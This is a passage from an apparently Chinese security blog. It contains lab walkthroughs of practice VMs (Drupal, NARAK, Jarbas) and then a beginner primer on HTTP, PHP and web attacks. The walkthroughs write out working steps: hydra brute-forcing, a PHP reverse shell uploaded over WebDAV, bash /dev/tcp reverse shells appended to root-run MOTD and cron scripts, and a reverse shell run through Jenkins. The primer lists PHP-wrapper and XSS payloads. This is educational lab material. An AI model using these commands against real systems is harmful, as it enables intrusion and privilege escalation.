class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;<span class="operator">/</span><span class="operator">/</span> 查询表内内容, 我们需要查 users 这个表 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314143457148.png" alt="image-20240314143457148"></p><p>密码被加密, 搜索Drupal 7的加密方式在 Drupal 的安装目录的scripts目录中, 有一些开发者备好的 PHP 脚本. 其中一个 <code>password-hash.sh</code> 可以传入然后加密一个字符串, 返回密文, 我们利用这个来进行下一步操作</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit// 退出mysql</span><br><span class="line">php scripts/password-hash.sh 123456</span><br><span class="line">// 不要进入 scripts 后调用 password-hash.sh, 会报错, 不知道为什么</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314145902841.png" alt="image-20240314145902841"></p><p>现在回到mysql中修改密码</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> uid,name,pass <span class="keyword">from</span> users;<span class="operator">/</span><span class="operator">/</span> 仅查看有用的部分</span><br><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span>&quot;&quot; <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;<span class="operator">/</span><span class="operator">/</span> 更改admin的密码</span><br><span class="line"><span class="keyword">select</span> uid,name,pass <span class="keyword">from</span> users;<span class="operator">/</span><span class="operator">/</span> 检查一下</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314151140960.png" alt="image-20240314151140960"></p><p>浏览器访问和登录就可以找到 flag3,下面是获得的提示, 提示我们查看passwd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line">特殊的PERMS将有助于查找密码, 但您需要执行该命令才能找到阴影中的内容。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314151956062.png" alt="image-20240314151956062"></p><p>flag4在根目录, 我们前往即可, 以下是获得的提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line">您可以使用相同的方法来查找或访问根中的标志吗? 可能, 但也许没那么容易 也许是这样?</span><br></pre></td></tr></table></figure><h2 id="提权-v2"><a class="header-anchor" href="#提权-v2">¶</a>提权</h2><p>flag3 和 flag4 分别给了提示: find 和 exec</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314153458022.png" alt="image-20240314153458022"></p><h2 id="后记"><a class="header-anchor" href="#后记">¶</a>后记</h2><ul><li><p>刚刚的用户 flag4 是 ssh 用户名, 我们可以用 hydra 进行爆破</p><p>爆破出来后连接进去也是需要 find 提权的, 这里不再赘述</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.8</span><br><span class="line">// 自行解压</span><br></pre></td></tr></table></figure><ul><li>可以直接执行 find 查找后缀为 txt 的文件, 直接找到最终 flag 后直接进行提权</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;.txt&quot;</span><br></pre></td></tr></table></figure><h1>ubuntu-NARAK</h1><h2 id="信息收集-v4"><a class="header-anchor" href="#信息收集-v4">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.10.8// 没东西</span><br><span class="line">nmap --script=vuln -p 22,80 192.168.10.8// 扫描漏洞</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314213201925.png" alt="image-20240314213201925"></p><p>基本一无所获, 只有几个类似目录和似乎是一个CSRF漏洞</p><p>网页访问, 没找到什么东西nmap已经帮我们扫出了两个目录, 可以试着访问/webadv的访问需要密码, 而/image中没有有用的东西</p><h2 id="账号密码获取"><a class="header-anchor" href="#账号密码获取">¶</a>账号密码获取</h2><p>测试后有爆破和目录扫描两种方法可以得到账号密码:</p><h3 id="爆破-v2"><a class="header-anchor" href="#爆破-v2">¶</a>爆破</h3><p>使用 kali 下的字典生成器 cewl 工具爬取该页面存在的字符串, 保存为txt形式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl 192.168.10.163 -w pass.txt</span><br></pre></td></tr></table></figure><p>得到这些字符串之后可以使用hydra进行爆破</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L pass.txt -P pass.txt 192.168.10.8 http-get /webdav</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314220429238.png" alt="image-20240314220429238">可以得到账号密码: yamdoot Swarg</p><h3 id="目录扫描"><a class="header-anchor" href="#目录扫描">¶</a>目录扫描</h3><p>换一个字典进行目录扫描<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314222715675.png" alt="image-20240314222715675"></p><p>可以找到 tips.txt, 可以直接访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint to open the door of narak can be found in creds.txt</span><br></pre></td></tr></table></figure><p>在得到这个提示之后, 会发现 creds.txt 无法访问</p><p>线索无法推进, 返回一开始的信息收集, 尝试其他方案</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sU --top-ports 10 192.168.10.8// 无结果</span><br><span class="line">nmap -sU --top-ports 20 192.168.10.8// tftp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314225053581.png" alt="image-20240314225053581"></p><p>tftp是一个简单文件传输协议, 用来在客户端和服务端进行文件传输, 它不具备通常的FTP的许多功能, 它只能从文件服务器上获得或写入文件, 不能列出目录试试能不能用tftp协议, 从靶机服务器把creds.txt下载下来</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tftp 192.168.10.8</span><br><span class="line">get creds.txt// 是base64编码</span><br><span class="line">cat creds.txt | base64 -d// 下载下来后解码</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314225642226.png" alt="image-20240314225642226">获得了账号和密码</p><h2 id="登录"><a class="header-anchor" href="#登录">¶</a>登录</h2><p>回到 <code>webdav</code> 页面, 输入用户名 yamdoot, 密码 Swarg虽然这里什么都没有, 但是有相应<strong>文件上传</strong>漏洞</p><blockquote><p>IIS6.0 sever在web服务扩展中开启了WebDAV.WebDAV是在一中HTTP1.1的扩展协议, 它扩展了HTTP1.1, 在GET、POST、HEAD等几个http标准方法以外添加了一些新的方法, 如PUT, 使应用程序可对Web Server直接读写, 并支持写文件锁定及解锁, 可以像在操作本地文件夹一样操作服务器上的文件夹</p><p>该扩展也存在缺陷, 利用PUT方法可直接向服务器上传恶意文件, 控制服务器, 导致PUT任意文件上传</p></blockquote><p>此时靶机已经提供了服务端, 我们只需要构造一个客户端就能利用这个漏洞</p><p>kali 工具 davtest ,用于测试通过 webdav 可以上传哪些对应文件以及其对应权限cadaver 是 webdav 客户端, 用来上传木马</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">davtest -url http://192.168.10.8/webdav -auth yamdoot:Swarg </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317175152693.png" alt="image-20240317175152693"></p><p>没有任何的过滤, 但是只有 php, txt, html 有相应执行权限, 可以利用php的反弹 shell</p><h3 id="反弹-shell-v2"><a class="header-anchor" href="#反弹-shell-v2">¶</a>反弹 shell</h3><p>msf 中的反弹 shell:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost= lport= R&gt;shell.php</span><br><span class="line">// -f raw 原始二进制数据</span><br></pre></td></tr></table></figure><p>手写反弹 shell 和利用过程:</p><p>利用 vim 编写木马 shell.php, 如果用 echo 查看文件会发现部分被编译丢失</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.10.1/10000 0&gt;&amp;1&#x27;&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">// 自己的 ip 然后是端口</span></span><br></pre></td></tr></table></figure><p>检查之后上传</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat shell.php</span><br><span class="line">cadaver http://192.168.10.8/webdav</span><br><span class="line">// 输入用户名和密码(yamdoot:Swarg)</span><br><span class="line">put shell.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317182553878.png" alt="image-20240317182553878"></p><p>再次访问 <code>webdav</code> 目录, 可以看到上传的 shell.php此时我们开启nc监听10000端口, 然后访问shell.php, 即可触发反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 10000</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317182829442.png" alt="image-20240317182829442"></p><p>查看用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">// infero narak yamdoot 三个用户</span><br></pre></td></tr></table></figure><p>查找可写的文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -writable -type f -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -not -path &quot;/var/*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317184836611.png" alt="image-20240317184836611"></p><p>依次查看看起来有用的文件, 只有 <a href="http://hell.sh">hell.sh</a> 有用, cat 之后可以得到一串字符, 可能是密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.+.+++++++++++.--.+++[-&gt;+++&lt;]&gt;++.++++++.--[---&gt;+&lt;]&gt;--.-----.++++.</span><br><span class="line">// 得到 chitragupt</span><br></pre></td></tr></table></figure><p>这是一种名为 brainfuck 的编程语言, 简称 bf, 找解码工具即可</p><h2 id="提权和获取flag"><a class="header-anchor" href="#提权和获取flag">¶</a>提权和获取flag</h2><h3 id="ssh"><a class="header-anchor" href="#ssh">¶</a>ssh</h3><p>第一个 flag 就在这里, 这里的ssh连接账号密码还可以在虚拟机的界面详情获取ssh连接, 账户 inferno, 密码 chitragupt, 连接就可以在当前目录下找到txt文件, 里面是flag<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317192341423.png" alt="whatsup"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">// user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">// Flag: &#123;5f95bf06ce19af69bfa5e53f797ce6e2&#125;</span><br></pre></td></tr></table></figure><p>第二个 flag 在 root 目录下我们现在并非管理员权限, 我们需要提权, sudo -l 查看权限, 一点没有那就一样搜索具有可写权限的文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -writable -type f -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -not -path &quot;/var/*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317194224825.png" alt="image-20240317194224825"></p><p>刚好, motd也是常见的提权方式之一</p><h3 id="motd提权"><a class="header-anchor" href="#motd提权">¶</a>motd提权</h3><blockquote><p>MOTD（Message of the Day）是Linux系统登录时显示的一段信息重点关注00-header, 这是linux在登录时会运行的显示欢迎信息的脚本, 可以发现这个就脚本的所有者和所在组都是root, 且此时inferno用户拥有对该文件的写权限, 因此我们只要在这个文件中添加反弹shell的代码, 当该脚本执行时即可触发反弹shell</p></blockquote><p>使用 vim/ vi 或直接 echo 追加, 添加反弹 shell 代码( 最底部即可 )</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.10.1/10000 0&gt;&amp;1&#x27;&quot; &gt;&gt; 00-header</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317195749760.png" alt="image-20240317195749760"></p><p>然后监听对应端口, 重新 ssh 连接即可连接反弹 shell<img src="C:/Users/CAO/AppData/Roaming/Typora/typora-user-images/image-20240317200056654.png" alt="image-20240317200056654"></p><p>然后在 /root 下可以找到 root.txt 文件,获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Root Flag: &#123;9440aee508b6215995219c58c8ba4b45&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317200316125.png" alt="image-20240317200316125"></p><h1>jarbas</h1><h2 id="信息收集-v5"><a class="header-anchor" href="#信息收集-v5">¶</a>信息收集</h2><p>用nmap进行简单扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.10.8</span><br></pre></td></tr></table></figure><p>开放端口: 22, 80, 3306, 8080服务: ssh, web, mysql, web_Jetty已知: 8080有一个 robot.txt 泄露</p><p>访问可以得到一段话:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#we don&#x27;t want robots to click &quot;build&quot; links</span><br></pre></td></tr></table></figure><p>没有收获用 dirb 进行目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.10.8 /common.txt</span><br><span class="line">// 这里用的不是不是 dirb 的自带字典, 是自己的</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317214943491.png" alt="image-20240317214943491"></p><p>访问access.html, 可以得到三组类似账号密码的东西这些字符串经过 md5 加密,可以在解密网站上解密, 结果为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago：italia99</span><br><span class="line">trindade：marianna</span><br><span class="line">eder：vipsu</span><br></pre></td></tr></table></figure><p>不知道干什么的就先放一边</p><p>访问8080, 发现是个登录界面, 正好上面三组, 拿来试一下只有 eder 是可以使用的</p><h2 id="渗透"><a class="header-anchor" href="#渗透">¶</a>渗透</h2><p>现在进入了后台, 可以进行木马上传, Jenkins平台相应漏洞可以搜索</p><p>新建任务 -&gt; 创建一个自由风格的软件项目 -&gt; 构建 -&gt; Execute shell -&gt; 输入反弹 shell<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317220810220.png" alt="image-20240317220810220"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.10.1/10000 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后在 kali 监听对应端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 10000</span><br></pre></td></tr></table></figure><p>在网站选择 保存( apply-&gt;save ) -&gt; 立刻构建(build now)<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317221642517.png" alt="image-20240317221642517"></p><h2 id="crontab提权"><a class="header-anchor" href="#crontab提权">¶</a>crontab提权</h2><p>非管理员, sudo -l 发现没有任何权限, 寻找具有可写权限的文件, 发现了 <a href="http://CleaningScript.sh">CleaningScript.sh</a>此处增加了 usr 是因为出现了大量usr的无关内容</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -writable -type f -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -not -path &quot;/var/*&quot; -not -path &quot;/usr/*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317224127641.png" alt="image-20240317224127641"></p><p>似乎只是一个删除网站日志的文件但这个文件不可能被人多次手动运行, 所以可能会在系统的计划任务之中</p><p>crontab是linux设置的一定周期执行一次的指令, 用于指定定时任务. 查看命令如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="C:/Users/CAO/AppData/Roaming/Typora/typora-user-images/image-20240317225134304.png" alt="image-20240317225134304"></p><p>而我们刚才查看的脚本就在这里面而且是每5分钟执行一次, 所以我们可以通过修改这个文件来以 root 命令执行反弹 shell 获得管理员权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.10.1/9999 0&gt;&amp;1&#x27; &gt;&gt;/etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure><p>在kali打开端口监听, 然后等待这个脚本被计划任务运行, 进去可以发现一个flag.txt<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240317225719350.png" alt="image-20240317225719350"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础</title>
      <link href="/article/at-the-beginning/"/>
      <url>/article/at-the-beginning/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>上联：为系统而生，为框架而死，为debug奋斗一辈子下联：吃符号的亏，上大小写的当，最后死在需求上！横批：悲剧程序员</p><h1>常见名词</h1><ul><li><p>渗透测试 (penetration test)是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法</p></li><li><p>域名</p><ol><li>顶级域名: 又叫一级域名, 一串字符串中间一个点隔开,例如<code>baidu.com</code>, 顶级域名是互联网DNS等级之中的最高级的域, 它保存于DNS根域的名字空间中。</li><li>二级域名: 实际上就是一个一级域名以下的主机名, 一串字符串中间两个“.”隔开, 例如<code>www.baidu.com</code>二级域名就是最靠近顶级域名左侧的字段</li><li>三级域名: 二级域名的子域名, 特征是包含三个“.”,例如<code>___.___.baidu.com</code></li></ol></li><li><p>DNS:域名系统,IP记起来总是不那么方便, 就采用了域名系统来管理名字和IP的对应关系</p></li><li><p>DDOS分布式拒绝服务攻击, 目的是使服务器无法处理请求崩溃</p></li><li><p>DNS缓存中毒给DNS服务器注入非法网络域名地址, 当这些非法地址进入服务器缓存, 用户的浏览器或者邮件服务器就会自动跳转到DNS指定的地址</p></li><li><p>DNS劫持攻击域名解析服务器, 或伪造域名解析服务器的方法把目标网站域名解析到错误的地址, 从而实现用户无法访问目标网站的目的</p></li><li><p>ARP欺骗通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞</p></li><li><p>POC:全称 ’ Proof of Concept '，常指一段漏洞证明的代码。</p></li><li><p>EXP:全称 ’ Exploit '，指利用系统漏洞进行攻击的动作。</p></li><li><p>Payload:&quot;有效载荷 &quot;，指成功exploit之后，真正在目标系统执行的代码或指令。</p></li><li><p>肉鸡：被黑客入侵并被长期驻扎的计算机或服务器</p></li><li><p>后门/ webshell：黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个&quot;入口&quot;</p></li><li><p>木马：表面上伪装成了正常的程序，但是当这些程序运行时，就会获取系统信息和权限</p></li><li><p>漏洞：硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等</p></li><li><p>提权：操作系统低权限的账户将自己提升为管理员权限使用的方法</p></li><li><p>跳板：使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份信息</p></li><li><p>反弹shell，C段入侵，旁站入侵，ATT&amp;CK等</p></li></ul><h1>HTTP协议</h1><h2 id="http与https区别"><a class="header-anchor" href="#http与https区别">¶</a>http与https区别</h2><ul><li>HTTPS是HTTP协议的安全版本，HTTP协议的数据传输是明文的，是不安全的，HTTPS使用了SSL/TLS协议进行了加密处理。</li><li>https更安全，所耗费资源也越高</li><li>HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗；</li><li>申请SSL证书需要钱，功能越强大的证书费用越高。</li></ul><h2 id="首部字段"><a class="header-anchor" href="#首部字段">¶</a>首部字段</h2><p>请求首部字段,  实体首部字段, 通用首部字段, 响应首部字段这个出现在修改请求包的题, 只列出常见部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">响应:</span><br><span class="line">Location: 令客户端重定向至指定URI（与请求URL位置不同）</span><br><span class="line">Server: HTTP服务器的安装信息（服务器应用程序）</span><br><span class="line"></span><br><span class="line">通用:</span><br><span class="line">Cache-Control: 控制缓存的行为（缓存的工作机制）</span><br><span class="line">Connection: 逐跳首部、连接的管理（控制不再转发给代理的首部字段；管理持久连接）</span><br><span class="line">Date: 创建报文的日期时间</span><br><span class="line">Via: 代理服务器的相关信息（追踪客户端域服务器之间的请求和响应报文的传输路径报文经过代理或网关的时候会在Via中附加该服务器的信息.可能会拿来出题）</span><br><span class="line"></span><br><span class="line">实体:</span><br><span class="line">Allow: 通知客户端可支持的HTTP方法（自报家门help，收到不支持的http方法时返回405）</span><br><span class="line">Content-Type: 实体主体的媒体类型，字段值用type/subtype赋值</span><br><span class="line">Content-Length: 实体主体的大小(单位∶字节)</span><br><span class="line"></span><br><span class="line">请求:</span><br><span class="line">Accept: 用户代理可处理的媒体类型及媒体类型的相对优先级，可使用type/subtype这种形式，一次指定多种媒体类型。</span><br><span class="line">Accept-Language: 告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级，可一次指定多种自然语言集</span><br><span class="line">Authorization: Web认证信息，用来告知服务器，用户代理的认证信息</span><br><span class="line">Host: 请求资源所在服务器，首部字段Host会告知服务器，请求的资源所处的互联网主机名和端口号（必须被包含在请求内）</span><br><span class="line">Referer: 对请求中URI的原始获取方，Referer会告知服务器请求的原始资源的URI</span><br><span class="line">User-Agent: HTTP客户端程序的信息，将创建请求的浏览器和用户代理名称等信息传达给服务器</span><br></pre></td></tr></table></figure><h2 id="HTTP常见状态码"><a class="header-anchor" href="#HTTP常见状态码">¶</a>HTTP常见状态码</h2><p>只有五类</p><ul><li>1xx 提供信息。</li><li>2xx 请求被成功提交。</li><li>3xx 客户端被重定向到其他资源。</li><li>4xx 请求包含某种错误。</li><li>5xx 服务器执行请求时遇到错误。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200 OK</span><br><span class="line">请求被正常处理了</span><br><span class="line"></span><br><span class="line">301 MOVED Permanently</span><br><span class="line">永久性重定向，应使用新的URI</span><br><span class="line"></span><br><span class="line">302 Found</span><br><span class="line">临时性重定向，希望用户(本次)能使用新的URI访问</span><br><span class="line"></span><br><span class="line">304 Not Modified</span><br><span class="line">客户端发送附带条件的请求时，服务器端允许请求访问资源, 未满足则不说话</span><br><span class="line"></span><br><span class="line">400 Bad Request</span><br><span class="line">表示请求报文中存在语法错误</span><br><span class="line"></span><br><span class="line">401 Unauthorized</span><br><span class="line">发送的请求需要有通过HTP认证的认证信息。若之前已请求过，则表示用户认证失效</span><br><span class="line"></span><br><span class="line">403 Forbidden</span><br><span class="line">访问被服务器拒绝了</span><br><span class="line"></span><br><span class="line">404 Not Found</span><br><span class="line">表明服务器上找不到</span><br><span class="line"></span><br><span class="line">500 Internal Server Error</span><br><span class="line">执行请求时发生了错误，也有可能是Web应用存在的bug或某些临时的故障.</span><br><span class="line"></span><br><span class="line">503 Service Unavailable</span><br><span class="line">服务器暂时处于超负载或者正在进行停机维护，现在无法处理请求</span><br></pre></td></tr></table></figure><h1>程序语言</h1><p>你应该上<a href="https://www.runoob.com/" title="很多的程序语言">菜鸟</a>继续您的学习HTML, PHP, JavaScript, 只需要能看得懂和记住重要函数即可</p><p>下面是你经常会看到的php方法:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常用方法</span></span><br><span class="line"><span class="title function_ invoke__">strlen</span>( )<span class="comment">// 检查字符串长度</span></span><br><span class="line"><span class="title function_ invoke__">strpos</span>( )<span class="comment">// 检索指定文本或字符</span></span><br><span class="line"><span class="title function_ invoke__">strcmp</span>( ) / <span class="title function_ invoke__">strcasecmp</span>( ) / <span class="title function_ invoke__">strncmp</span>( )<span class="comment">// 字符串比较</span></span><br><span class="line"><span class="title function_ invoke__">strstr</span>( ) / <span class="title function_ invoke__">stristr</span>( )<span class="comment">// 查找替换</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>( )<span class="comment">// 获取变量的整数值</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>( )<span class="comment">// 检测指定的变量是否为数字或数字字符串</span></span><br><span class="line"><span class="keyword">isset</span>( )<span class="comment">// 检测变量是否已设置并且非NULL</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed)<span class="comment">// 以seed作为随机数生成的种子</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 魔术方法</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()<span class="comment">// 当尝试以调用函数的方式调用对象的时候，就会调用该方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__construst</span>()<span class="comment">// 具有构造函数的类在创建新对象的时候，回调此方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()<span class="comment">// 反序列化的时候，或者对象销毁的时候调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">// 反序列化的时候调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()<span class="comment">//序列化的时候调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br><span class="line"><span class="comment">// 把类当成字符串的时候调用，一般在echo处生效</span></span><br><span class="line"><span class="comment">// (对一个对象进行 echo 操作或者 print 操作, 变量赋值为对象后与字符串做弱类型比较的时候, 变量赋值为对象后进行正则匹配的时候, 变量被赋值为对象后进行 strolower 的时候)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()<span class="comment">// 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()<span class="comment">// 读取不可访问或者不存在的属性的时候，进行赋值</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">// 在对象中调用一个不可访问的方法的时候，会被执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>MySQL</h1><p>了解数据库的结构, 应用于 sql 注入</p><h1>PHP伪协议</h1><table><thead><tr><th>协议</th><th>allow_url_fopen</th><th>allow_url_include</th><th>用法</th><th>用途</th></tr></thead><tbody><tr><td>php://filter</td><td>off/on</td><td>off/on</td><td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td><td>用于读取这个php文件源码内容</td></tr><tr><td>php://input</td><td>off/on</td><td>on</td><td>?file=php://input,post数据:<?php phpinfo();?></td><td>访问请求的原始数据的只读流，将post请求的数据当作php代码执行</td></tr><tr><td>zip://</td><td>off/on</td><td>off/on</td><td>?file=zip://file.zip%23phpinfo.txt</td><td>访问压缩文件中的子文件，子文件可修改为任意后缀依然会被当作php执行</td></tr><tr><td>data://</td><td>on</td><td>on</td><td>?file=data:text/plain;<?php phpinfo();?></td><td>以传递相应格式的数据用来执行PHP代码</td></tr><tr><td>file:/</td><td>off/on</td><td>off/on</td><td>?file=file:/lC:phpinfo.txt</td><td>用于访问本地文件系统</td></tr></tbody></table><p>data://的其他应用格式:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo</span><br><span class="line">?file=data://text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</span><br></pre></td></tr></table></figure><blockquote><p>allow_url_fopen ：on #默认开启 ，表示允许url里的封装协议访问文件；allow_url_include：off #默认关闭，表示不允许包含url里的封装协议包含文件；</p></blockquote><h1>XSS攻击可用标签</h1><p>常见的可以进行插入的, 自动触发js代码的标签(部分):</p><p>&lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;img&gt; 标签定义 HTML 页面中的图像。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;input&gt; 标签规定了用户可以在其中输入数据的输入字段。</p><figure class="highlight html"><table><tr><td class="code"><pre><span 